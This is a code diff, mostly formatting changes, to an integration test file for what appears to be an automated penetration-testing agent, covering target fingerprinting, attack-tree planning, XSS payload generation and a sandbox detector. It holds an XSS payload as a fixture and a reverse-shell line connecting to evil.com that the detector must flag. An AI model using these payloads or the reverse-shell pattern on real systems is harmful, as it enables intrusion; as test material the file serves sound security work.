@@ -14,6 +14,7 @@ What this test checks:
   6. SubprocessSandbox runs clean code + refuses dangerous
   7. ChainOfThoughtLogger writes data/cot_logs/*.json
 """
+
 from __future__ import annotations
 
 import json
@@ -31,21 +32,23 @@ sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 
 # ── Mock HTTP server with nginx+PHP+WordPress+Drupal fingerprint ──
 
+
 class MockFingerprintHandler(BaseHTTPRequestHandler):
     """Mocks testphp.vulnweb.com fingerprint for integration tests."""
+
     def do_GET(self):
         self.send_response(200)
         self.send_header("Server", "nginx/1.21.4")
         self.send_header("X-Powered-By", "PHP/8.1.2")
         self.send_header("Set-Cookie", "SESSabc=xyz; path=/")
         body = (
-            b'<!DOCTYPE html><html><head>'
+            b"<!DOCTYPE html><html><head>"
             b'<meta name="generator" content="WordPress 6.4" />'
             b'<link rel="stylesheet" href="/sites/default/files/css/css_x.css" />'
             b'<script src="/wp-content/themes/twentytwentyone/script.js"></script>'
-            b'</head><body>'
+            b"</head><body>"
             b'<div class="region region-content">Drupal content</div>'
-            b'</body></html>'
+            b"</body></html>"
         )
         self.send_header("Content-Type", "text/html; charset=UTF-8")
         self.send_header("Content-Length", str(len(body)))
@@ -68,13 +71,15 @@ def mock_server():
 
 # ── W2: fingerprint ───────────────────────────────────────────────
 
+
 def test_w2_fingerprint_detects_tech_stack(mock_server):
     """W2 verification: _fingerprint_target_for_planning() returns real stack."""
     # agent_brain.py lives at the project root, not under agents/
     from agent_brain import ElengenixAgent
 
     class _StubActivityLogger:
-        def log_thought(self, *args, **kwargs): pass
+        def log_thought(self, *args, **kwargs):
+            pass
 
     agent = ElengenixAgent.__new__(ElengenixAgent)
     agent._fingerprint_cache = {}
@@ -90,13 +95,16 @@ def test_w2_fingerprint_detects_tech_stack(mock_server):
 
 def test_w2_planner_uses_fingerprint_for_more_steps(mock_server):
     """W2 verification: WITH fingerprint, planner produces more semantic steps."""
+    from agents.agent_dataclasses import AttackPhase, AttackStep, AttackTree
     from agents.agent_planner import AttackVectorDatabase
-    from agents.agent_dataclasses import AttackStep, AttackTree, AttackPhase
 
     class _StubPlanner:
         def __init__(self):
             self.vector_db = AttackVectorDatabase()
-        def generate_attack_tree(self, target, objective="discover vulnerabilities", fingerprint=None):
+
+        def generate_attack_tree(
+            self, target, objective="discover vulnerabilities", fingerprint=None
+        ):
             steps = []
             if fingerprint:
                 techs = fingerprint.get("technologies", []) or []
@@ -105,18 +113,22 @@ def test_w2_planner_uses_fingerprint_for_more_steps(mock_server):
                 hyps = self.vector_db.hypotheses_for(all_techs)
                 for vuln_class, hypothesis_text, tools in hyps:
                     for tool in tools:
-                        steps.append(AttackStep(
-                            phase=AttackPhase.EXPLOITATION,
-                            tool_name=tool,
-                            target=target,
-                            purpose=f"[{vuln_class}] {hypothesis_text}",
-                        ))
-            steps.append(AttackStep(
-                phase=AttackPhase.RECONNAISSANCE,
-                tool_name="subfinder",
-                target=target,
-                purpose="default recon: subdomain enumeration",
-            ))
+                        steps.append(
+                            AttackStep(
+                                phase=AttackPhase.EXPLOITATION,
+                                tool_name=tool,
+                                target=target,
+                                purpose=f"[{vuln_class}] {hypothesis_text}",
+                            )
+                        )
+            steps.append(
+                AttackStep(
+                    phase=AttackPhase.RECONNAISSANCE,
+                    tool_name="subfinder",
+                    target=target,
+                    purpose="default recon: subdomain enumeration",
+                )
+            )
             return AttackTree(target=target, objective=objective, steps=steps)
 
     planner = _StubPlanner()
@@ -150,8 +162,9 @@ def test_w2_planner_uses_fingerprint_for_more_steps(mock_server):
     print(f"[PLANNER] steps WITHOUT fingerprint: {len(steps_without)}")
 
     # Fingerprint should add AT LEAST one vuln-class-specific step
-    assert len(steps_with) >= len(steps_without), \
-        f"Fingerprint should not reduce steps: with={len(steps_with)} without={len(steps_without)}"
+    assert len(steps_with) >= len(
+        steps_without
+    ), f"Fingerprint should not reduce steps: with={len(steps_with)} without={len(steps_without)}"
     vuln_classes_with = set()
     for s in steps_with:
         # Extract vuln class from purpose: "[vuln_class] description"
@@ -160,21 +173,24 @@ def test_w2_planner_uses_fingerprint_for_more_steps(mock_server):
             end = purpose.find("]")
             if end > 1:
                 vuln_classes_with.add(purpose[1:end].lower())
-    assert any("php" in vc or "sql" in vc or "xss" in vc for vc in vuln_classes_with), \
-        f"Expected PHP/SQL/XSS vuln classes from fingerprint, got: {vuln_classes_with}"
+    assert any(
+        "php" in vc or "sql" in vc or "xss" in vc for vc in vuln_classes_with
+    ), f"Expected PHP/SQL/XSS vuln classes from fingerprint, got: {vuln_classes_with}"
 
 
 # ── W3: smart payload generator via pipeline ─────────────────────
+
 
 def test_w3_smart_payload_generator_runs_through_pipeline():
     """W3 verification: SmartPayloadGenerator runs via analysis pipeline."""
     import os
     import tempfile
-    from tools.analysis_pipeline import AnalysisPipeline
-    from tools.payload_mutation import PayloadMutator, SmartPayloadGenerator
-    from tools.mission_state import MissionState
-    from tools.tool_registry import ToolResult, ToolCategory
     import types
+
+    from tools.analysis_pipeline import AnalysisPipeline
+    from tools.mission_state import MissionState
+    from tools.payload_mutation import PayloadMutator, SmartPayloadGenerator
+    from tools.tool_registry import ToolCategory, ToolResult
 
     tmpdir = tempfile.mkdtemp()
     os.environ["ELENGENIX_DATA_DIR"] = tmpdir
@@ -191,11 +207,13 @@ def test_w3_smart_payload_generator_runs_through_pipeline():
         success=True,
         tool_name="dalfox",
         category=ToolCategory.SCANNER,
-        findings=[{
-            "type": "xss",
-            "payload": "<script>alert(1)</script>",
-            "severity": "high",
-        }],
+        findings=[
+            {
+                "type": "xss",
+                "payload": "<script>alert(1)</script>",
+                "severity": "high",
+            }
+        ],
     )
     ms = MissionState(
         mission_id="w4_integration",
@@ -216,11 +234,16 @@ def test_w3_smart_payload_generator_runs_through_pipeline():
     assert generator == "smart", f"Expected smart generator, got {generator}"
     assert len(variants) >= 10, f"Expected >=10 variants, got {len(variants)}"
     # Real XSS payloads, not URL-encoded garbage
-    assert any("<script" in v["payload"].lower() or "<img" in v["payload"].lower() or "<svg" in v["payload"].lower() for v in variants), \
-        f"Expected real XSS payloads, got: {[v['payload'][:60] for v in variants[:5]]}"
+    assert any(
+        "<script" in v["payload"].lower()
+        or "<img" in v["payload"].lower()
+        or "<svg" in v["payload"].lower()
+        for v in variants
+    ), f"Expected real XSS payloads, got: {[v['payload'][:60] for v in variants[:5]]}"
 
 
 # ── W1: AST sandbox catches eval/exec/imports ────────────────────
+
 
 def test_w1_ast_sandbox_catches_eval():
     """W1 verification: RealDangerousPatternDetector catches eval()."""
@@ -232,8 +255,9 @@ def test_w1_ast_sandbox_catches_eval():
     result = detector.analyze("x = eval('1+1')\n")
     assert not result.is_safe, "eval() must be flagged as dangerous"
     hits_descriptions = [h.description.lower() for h in result.hits]
-    assert any("eval" in d for d in hits_descriptions), \
-        f"Expected eval in hits, got: {hits_descriptions}"
+    assert any(
+        "eval" in d for d in hits_descriptions
+    ), f"Expected eval in hits, got: {hits_descriptions}"
     print(f"[W1] eval() blocked: {result.summary()}")
 
 
@@ -241,7 +265,9 @@ def test_w1_ast_sandbox_catches_subprocess():
     """W1 verification: RealDangerousPatternDetector catches subprocess."""
     from tools.ai_sandbox import RealDangerousPatternDetector
 
-    detector = RealDangerousPatternDetector(allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False)
+    detector = RealDangerousPatternDetector(
+        allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False
+    )
     result = detector.analyze("import subprocess\nsubprocess.run(['ls'])\n")
     assert not result.is_safe
     hits_descriptions = [h.description.lower() for h in result.hits]
@@ -253,7 +279,9 @@ def test_w1_ast_sandbox_catches_reverse_shell():
     """W1 verification: RealDangerousPatternDetector catches reverse shell."""
     from tools.ai_sandbox import RealDangerousPatternDetector
 
-    detector = RealDangerousPatternDetector(allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False)
+    detector = RealDangerousPatternDetector(
+        allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False
+    )
     result = detector.analyze("import socket; s = socket.socket(); s.connect(('evil.com', 4444))\n")
     assert not result.is_safe
     print(f"[W1] reverse shell blocked: {result.summary()}")
@@ -263,7 +291,9 @@ def test_w1_ast_sandbox_allows_clean_code():
     """W1 verification: RealDangerousPatternDetector allows safe code."""
     from tools.ai_sandbox import RealDangerousPatternDetector
 
-    detector = RealDangerousPatternDetector(allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False)
+    detector = RealDangerousPatternDetector(
+        allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False
+    )
     code = """
 def fibonacci(n):
     a, b = 0, 1
@@ -280,9 +310,10 @@ print(fibonacci(10))
 
 # ── W1: subprocess sandbox runs clean code ────────────────────────
 
+
 def test_w1_subprocess_sandbox_runs_clean_code():
     """W1 verification: SubprocessSandbox executes clean code within limits."""
-    from tools.ai_sandbox import SubprocessSandbox, SandboxConfig
+    from tools.ai_sandbox import SandboxConfig, SubprocessSandbox
 
     config = SandboxConfig(
         timeout_seconds=3,
@@ -291,24 +322,36 @@ def test_w1_subprocess_sandbox_runs_clean_code():
     )
     sandbox = SubprocessSandbox(config)
     result = sandbox.run('print("hello from sandbox")\n')
-    assert result.returncode == 0, f"Expected returncode 0, got {result.returncode} (stderr={result.stderr})"
+    assert (
+        result.returncode == 0
+    ), f"Expected returncode 0, got {result.returncode} (stderr={result.stderr})"
     assert "hello from sandbox" in result.stdout
-    print(f"[W1] sandbox ran clean code: stdout={result.stdout.strip()}, returncode={result.returncode}")
+    print(
+        f"[W1] sandbox ran clean code: stdout={result.stdout.strip()}, returncode={result.returncode}"
+    )
 
 
 def test_w1_subprocess_sandbox_refuses_dangerous_code():
     """W1 verification: SubprocessSandbox refuses eval() at AST level."""
-    from tools.ai_sandbox import SubprocessSandbox, SandboxConfig
+    from tools.ai_sandbox import SandboxConfig, SubprocessSandbox
 
     config = SandboxConfig(timeout_seconds=3, cpu_time_seconds=2)
     sandbox = SubprocessSandbox(config)
     result = sandbox.run("x = eval('1+1')\n")
     assert not result.success, "Sandbox must reject eval() before execution"
-    assert result.returncode != 0 or "refused" in result.stderr.lower() or "dangerous" in result.stderr.lower() or "blocked" in result.stderr.lower()
-    print(f"[W1] sandbox refused eval(): returncode={result.returncode}, stderr={result.stderr[:80]}")
+    assert (
+        result.returncode != 0
+        or "refused" in result.stderr.lower()
+        or "dangerous" in result.stderr.lower()
+        or "blocked" in result.stderr.lower()
+    )
+    print(
+        f"[W1] sandbox refused eval(): returncode={result.returncode}, stderr={result.stderr[:80]}"
+    )
 
 
 # ── CoT logger writes JSON ────────────────────────────────────────
+
 
 def test_cot_logger_writes_json(tmp_path):
     """Verify ChainOfThoughtLogger writes session JSON to data/cot_logs/."""
@@ -354,6 +397,7 @@ def test_cot_logger_writes_json(tmp_path):
 
 
 # ── Summary ───────────────────────────────────────────────────────
+
 
 def test_w4_integration_summary(mock_server):
     """Final W4 summary: all 3 wirings work end-to-end."""
